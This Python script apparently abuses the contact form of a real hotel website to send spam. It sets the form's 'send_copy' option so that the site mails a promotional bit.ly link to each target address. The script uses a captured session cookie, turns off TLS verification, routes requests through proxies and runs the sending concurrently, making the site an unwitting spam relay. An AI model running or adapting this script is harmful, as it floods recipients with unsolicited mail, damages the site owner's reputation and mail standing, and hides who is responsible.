import requests

from module.spam_abstraction import Spam

url = 'http://renzzihotel.com/index.php/help'

cookies = {
    '99fb2edf4a5df76cd02ba1a017a82299': '4cff16fda35c632343b1e25efcd91090',
}

headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'http://renzzihotel.com',
    'Referer': 'http://renzzihotel.com/index.php/help',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response:
        text = self.get_text()
        data = {
            'name': target,
            'email': target,
            'message': text,
            'subject': text,
            'date': '2022/11/30 12:51',
            'send_copy': '1',
            'task': 'sendmail',
            'ctajax_modid': '144',
        }

        response = requests.post(url, cookies=cookies, headers=headers, data=data, verify=False,
                                 proxies=self.get_proxies())
        return response


if __name__ == '__main__':
    success_message = 'Your email has been sent.'
    project_name = 'renzzihotel'
    promo_link = 'bit.ly/3UIzw6e'
    spam = ConcreteSpam(promo_link, project_name, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)
